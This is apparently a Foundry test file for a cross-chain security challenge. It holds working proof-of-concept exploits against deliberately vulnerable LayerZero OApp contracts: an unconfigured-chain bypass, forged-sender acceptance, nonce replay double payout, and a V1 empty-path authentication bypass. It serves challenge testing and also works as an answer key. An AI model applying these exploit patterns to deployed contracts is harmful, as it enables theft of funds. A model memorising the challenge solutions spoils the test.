// SPDX-License-Identifier: MIT
// LayerZero cross-chain challenge tests — the exploit demonstrations the
// solver is expected to discover. Each test is a class from the LayerZero
// threat model, kept at unit scale (no real endpoint needed: these bugs live
// in the OApp's own validation, which the endpoint calls with attacker-
// controllable Origin values on a compromised/weak configuration).
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {LayerZeroOAppV2} from "../src/challenges/LayerZeroOAppV2.sol";
import {LayerZeroOAppV1} from "../src/challenges/LayerZeroOAppV1.sol";
import {ERC20Mintable} from "../src/tokens/ERC20Mintable.sol";

contract LayerZeroChallengeTest is Test {
    ERC20Mintable internal token;
    LayerZeroOAppV2 internal oappV2;
    LayerZeroOAppV1 internal oappV1;
    address internal deployer;
    address internal attacker;
    address internal user;

    uint32 internal constant ETH_EID = 30101;
    uint32 internal constant ARB_EID = 30110;
    // V1 used uint16 chain ids — keep the historical types in the V1 tests.
    uint16 internal constant ETH_CHAIN_V1 = 101;
    uint16 internal constant FAKE_CHAIN_V1 = 999;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        user = makeAddr("user");

        // OApps deploy unpranked: the test contract is their owner/config
        // admin, and value for the V2 native vault comes from address(this).
        vm.deal(address(this), 1_000_000 ether);
        vm.startPrank(deployer);
        token = new ERC20Mintable("Cross Token", "XTK");
        vm.stopPrank();
        oappV2 = new LayerZeroOAppV2{value: 500_000 ether}();
        oappV1 = new LayerZeroOAppV1(address(token));
        // Configure ONE peer honestly — the bugs are about the chains that
        // are NOT configured and the sender value that is never bound.
        oappV2.setPeer(ETH_EID, bytes32(uint256(uint160(0xB0B))));
        oappV1.setTrustedRemote(ETH_CHAIN_V1, abi.encodePacked(address(0xB0B)));
        // Deployer is the token minter; mint to the test contract, then fund
        // the V1 payout vault.
        vm.prank(deployer);
        token.mint(address(this), 1_000_000 ether);
        token.transfer(address(oappV1), 500_000 ether);
    }

    // ── Class: unauthorized sender / peer bypass (challenge #6) ──

    function test_v2_unconfiguredChainBypass() public {
        // A message from a chain with NO peer configured executes anyway.
        LayerZeroOAppV2.Origin memory origin = LayerZeroOAppV2.Origin({
            srcEid: ARB_EID, // deliberately unconfigured
            sender: bytes32(uint256(uint160(0xBAD))),
            nonce: 1
        });
        bytes memory message = abi.encode(attacker, 10_000 ether);

        vm.prank(attacker); // no endpoint in the unit — proof is the authz gap
        oappV2.lzReceive(origin, bytes32(0), message, attacker, "");

        assertEq(attacker.balance, 10_000 ether, "unconfigured-chain msg must not pay");
    }

    function test_v2_senderNotBoundToPeer() public {
        // Even on the CONFIGURED chain, any claimed sender passes: only the
        // chain id is checked, origin.sender is never compared to the peer.
        LayerZeroOAppV2.Origin memory origin = LayerZeroOAppV2.Origin({
            srcEid: ETH_EID,
            sender: bytes32(uint256(uint160(0xBAD))), // NOT the trusted peer 0xB0B
            nonce: 1
        });
        bytes memory message = abi.encode(attacker, 5_000 ether);

        vm.prank(attacker);
        oappV2.lzReceive(origin, bytes32(0), message, attacker, "");

        assertEq(attacker.balance, 5_000 ether, "forged sender must not pay");
    }

    // ── Class: cross-chain replay (challenge #1) ──

    function test_v2_messageReplayDoublePayout() public {
        LayerZeroOAppV2.Origin memory origin = LayerZeroOAppV2.Origin({
            srcEid: ETH_EID,
            sender: bytes32(uint256(uint160(0xB0B))), // the real peer
            nonce: 7
        });
        bytes memory message = abi.encode(user, 1_000 ether);

        vm.prank(address(0xE1)); // simulate honest delivery once
        oappV2.lzReceive(origin, bytes32(uint256(7)), message, address(0xE1), "");
        uint256 afterFirst = address(oappV2).balance;

        // Replay the SAME (srcEid, sender, nonce, payload) — the nonce was
        // recorded but never checked, so the payout repeats.
        vm.prank(address(0xE1));
        oappV2.lzReceive(origin, bytes32(uint256(7)), message, address(0xE1), "");

        assertEq(user.balance, 2_000 ether, "replay must double-pay");
        assertLt(address(oappV2).balance, afterFirst, "vault lost extra funds on replay");
        assertTrue(oappV2.isExecuted(ETH_EID, origin.sender, 7, message), "forensics key set but unchecked");
    }

    // ── Class: V1 empty-path bypass (address-format confusion, #11) ──

    function test_v1_emptyPathBypass() public {
        // Empty srcAddress + forged chain id authenticates: bytes32(0) cast
        // equals the stored empty path after the << 96 normalization.
        bytes memory payload = abi.encode(attacker, 25_000 ether);
        vm.prank(attacker);
        oappV1.lzReceive(FAKE_CHAIN_V1, "", 1, payload);
        assertEq(token.balanceOf(attacker), 25_000 ether, "empty path must not authenticate");
    }

    // ── Honest-path guard (solver must not break the real flow) ──

    function test_v1_honestPathStillPays() public {
        bytes memory payload = abi.encode(user, 1_000 ether);
        bytes memory path = abi.encodePacked(address(0xB0B));
        vm.prank(address(0xB0B));
        oappV1.lzReceive(ETH_CHAIN_V1, path, 1, payload);
        assertEq(token.balanceOf(user), 1_000 ether, "honest configured path must pay");
    }
}
